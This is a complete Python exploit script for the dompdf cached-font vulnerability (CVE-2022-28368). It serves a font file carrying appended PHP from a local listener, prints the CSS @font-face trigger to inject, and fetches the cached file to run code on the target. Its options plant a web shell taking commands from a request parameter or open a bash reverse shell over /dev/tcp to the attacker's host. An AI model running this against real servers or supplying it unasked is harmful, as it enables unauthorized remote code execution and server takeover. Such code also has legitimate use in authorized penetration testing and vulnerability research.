#!/usr/bin/python3
import socket, requests, hashlib, argparse, base64, urllib.parse

def handleArguments():
    parser=argparse.ArgumentParser(description="This script handles the majority of the dompdf cached font exploit (CVE-2022-28368), all you need to do is create the request")
    parser.add_argument("-d", "--dompdf-location", help="dompdf location on target webserver (example: http://target.com/vendor/dompdf)", required=True)
    parser.add_argument("-f", "--fontname", help="Exploit font name (default: expfont.php)", default="expfont.php")
    parser.add_argument("-i", "--http-ip", help="HTTP listener IP", required=True)
    parser.add_argument("-p", "--http-port", help="HTTP listener PORT (default: 80)", type=int, default=80)
    parser.add_argument("-P", "--php", help="PHP to execute (default: <?php system(\"whoami\"); ?>)", default="<?php system(\"whoami\"); ?>")
    parser.add_argument("-w", "--webshell", help="Spawn web shell", action="store_true")
    parser.add_argument("-r", "--revshell", help="Spawn reverse shell (Uses HTTP listener IP and port 9001 by default)", action="store_true")
    return parser.parse_args()

def initPseudoHTTPSocket(ip, port):
    s=socket.socket()
    s.bind((ip, port))
    s.listen()
    print(f"[!] Listening on {ip}:{port}")
    return s

def getClient(s):
    client, addr = s.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    return client

def checkHTTPClient(client, fontname):
    req = client.recv(4096)
    return req.startswith(f"GET /{fontname} HTTP/".encode())

def sendResp(resp, client):
    fontStuff=base64.b64decode(b"AAEAAAAKAO+/vQADACBkdW0xAAAAAAAAAO+/vQAAAAJjbWFwAAwAYAAAAO+/vQAAACxnbHlmNXNj77+9AAAA77+9AAAAFGhlYWQH77+9UTYAAADvv70AAAA2aGhlYQDvv70D77+9AAABKAAAACRobXR4BEQACgAAAUwAAAAIbG9jYQAKAAAAAAFUAAAABm1heHAABAADAAABXAAAACBuYW1lAEQQ77+9AAABfAAAADhkdW0yAAAAAAAAAe+/vQAAAAIAAAAAAAAAAQADAAEAAAAMAAQAIAAAAAQABAABAAAALe+/ve+/vQAAAC3vv73vv73vv73vv70AAQAAAAAAAQAKAAAAOgA4AAIAADMjNTowOAABAAAAAQAAF++/ve+/vRZfDzzvv70ACwBAAAAAAO+/vRU4BgAAAADvv70m270ACgAAADoAOAAAAAYAAQAAAAAAAAABAAAATO+/ve+/vQASBAAACgAKADoAAQAAAAAAAAAAAAAAAAAAAAIEAAAAAEQACgAAAAAACgAAAAEAAAACAAMAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEADYAAwABBAkAAQACAAAAAwABBAkAAgACAAAAAwABBAkAAwACAAAAAwABBAkABAACAAAAcwAAAAAK").decode()
    client.send(("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"+fontStuff+resp).encode())
    client.close()
    print("[+] Payload delivered")

def triggerPayload(args, command=False):
    md5 = hashlib.md5()
    md5.update(f"http://{args.http_ip}:{args.http_port}/{args.fontname}".encode())
    md5hash = md5.hexdigest()
    url=f"{args.dompdf_location}/lib/fonts/{'.'.join(args.fontname.split('.')[:-1])}_normal_{md5hash}.{args.fontname.split('.')[-1]}"
    if command!=False:
        url+="?c="+urllib.parse.quote(command)

    print(f"[!] Triggering payload at {url}")

    resp = requests.get(url)
    if not resp.ok:
        print("[-] Payload failed (Status code >= 400)")
        return
    print("[+] Payload triggered successfully")
    print(resp.text[440:])
    return

def spawnRevShell(client, args):
    sendResp(f"<?php system(\"bash -c 'bash -i >& /dev/tcp/{args.http_ip}/9001 0>&1'\"); ?>", client)
    triggerPayload(args)

def spawnWebShell(client, args):
    sendResp("<?php system($_REQUEST['c']); ?>", client)
    while True:
        triggerPayload(args, command=input(">"))

def standardPHP(client, args):
    sendResp(args.php, client)
    triggerPayload(args)

def main():
    args = handleArguments()
    s = initPseudoHTTPSocket(args.http_ip, args.http_port)
    print("[!] Use to trigger:")
    print("<!DOCTYPE html><html><head><style>@font-face {font-family:\""+".".join(args.fontname.split(".")[:-1])+"\";src:url(\"http://"+args.http_ip+":"+str(args.http_port)+"/"+args.fontname+"\");font-weight:\"normal\";font-style:\"normal\";}</style></head></html>")
    client = getClient(s)
    s.close()
    if not checkHTTPClient(client, args.fontname):
        print("[-] Client does not appear to be communicating via HTTP or sent an unexpected request")
        return
    if args.revshell:
        spawnRevShell(client, args)
    elif args.webshell:
        spawnWebShell(client, args)
    else:
        standardPHP(client, args)

if __name__=="__main__":
    main()
